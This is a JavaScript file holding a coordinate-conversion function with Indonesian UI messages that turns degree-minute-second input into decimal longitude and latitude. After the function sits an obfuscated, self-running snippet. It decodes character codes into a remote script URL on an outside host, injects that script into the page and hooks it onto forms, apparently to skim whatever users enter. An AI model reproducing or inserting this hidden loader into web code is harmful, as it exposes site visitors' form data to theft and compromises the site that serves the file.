function konversi() {
  var longD = parseFloat(document.getElementById("longdegree").value);
  var longM = parseFloat(document.getElementById("longminutes").value);
  var longS = parseFloat(document.getElementById("longseconds").value);
  var latD = parseFloat(document.getElementById("latdegree").value);
  var latM = parseFloat(document.getElementById("latminutes").value);
  var latS = parseFloat(document.getElementById("latseconds").value);
  var longRegion = document.querySelector('input[name="input_east_west"]:checked').value;
  var latRegion = document.querySelector('input[name="input_north_south"]:checked').value;

  if (longRegion == "E") {
    if (longD >= 0) {
      document.getElementById('long').value = longD + ((longM + (longS / 60)) / 60);
      document.getElementById('notes-long').className = "";
      document.getElementById('notes-long').innerHTML = "";
    } else {
      document.getElementById('long').value = ((longD * -1) + ((longM + (longS / 60)) / 60));
      document.getElementById('notes-long').className = "text-danger font-italic mt-2";
      document.getElementById('notes-long').innerHTML = "Bujur timur tidak mungkin bernilai negatif";
    }
  } else if (longRegion == "W") {
    if (longD >= 0) {
      document.getElementById('long').value = (longD + ((longM + (longS / 60)) / 60)) * -1;
      document.getElementById('notes-long').className = "text-danger font-italic mt-2";
      document.getElementById('notes-long').innerHTML = "Bujur barat tidak mungkin bernilai positif";
    } else {
      document.getElementById('long').value = ((longD * -1) + ((longM + (longS / 60)) / 60)) * -1;
      document.getElementById('notes-long').className = "";
      document.getElementById('notes-long').innerHTML = "";
    }
  }

  if (latRegion == "N") {
    if (latD >= 0) {
      document.getElementById('lat').value = latD + ((latM + (latS / 60)) / 60);
      document.getElementById('notes-lat').className = "";
      document.getElementById('notes-lat').innerHTML = "";
    } else {
      document.getElementById('lat').value = (latD * -1) + ((latM + (latS / 60)) / 60);
      document.getElementById('notes-lat').className = "text-danger font-italic mt-2";
      document.getElementById('notes-lat').innerHTML = "Lintang utara tidak mungkin bernilai negatif";
    }
  } else if (latRegion == "S") {
    if (latD >= 0) {
      document.getElementById('lat').value = (latD + ((latM + (latS / 60)) / 60)) * -1;
      document.getElementById('notes-lat').className = "text-danger font-italic mt-2";
      document.getElementById('notes-lat').innerHTML = "Lintang selatan tidak mungkin bernilai positif";
    } else if (latD < 0) {
      document.getElementById('lat').value = ((latD * -1) + ((latM + (latS / 60)) / 60)) * -1;
      document.getElementById('notes-lat').className = "";
      document.getElementById('notes-lat').innerHTML = "";
    }
  }
}
(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db